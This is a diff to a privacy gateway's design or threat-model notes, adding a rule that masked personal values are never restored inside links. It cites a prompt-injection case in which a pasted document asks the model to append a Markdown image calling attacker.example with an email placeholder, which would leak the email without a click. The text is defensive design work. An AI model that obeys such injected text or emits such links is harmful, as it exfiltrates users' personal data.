@@ -51,6 +51,16 @@ with each phase; the threat model gets its full review before the first pilot.
   that, the local Ollama tier keeps everything on the machine.
 - Restoring values can fail. A model may rewrite `[PERSON_1]` as "the client".
   The gateway shows such placeholders to the user instead of guessing (ADR 0003).
+- A value is never restored inside a link, so links in answers can show
+  placeholders. A pasted document can ask the model to end its answer with an
+  image such as `![s](https://attacker.example/p.png?d=[EMAIL_1])`; restoring
+  the email there would let a Markdown client send it to that host without a
+  click. Placeholders in bare URLs, Markdown link and image targets, link
+  reference definitions, autolinks and HTML attribute values are left as
+  written and counted as unresolved (ADR 0003 amendment 1). Detecting these
+  contexts errs towards "inside", so a placeholder next to some link-like text
+  may also stay visible. A value the model writes out itself, rather than as a
+  placeholder, is outside this rule: it was never masked.
 - Russian and Armenian coverage is weaker than English, and it is measured
   separately.
 - Armenian text, and text in any alphabet other than Latin and Cyrillic, goes
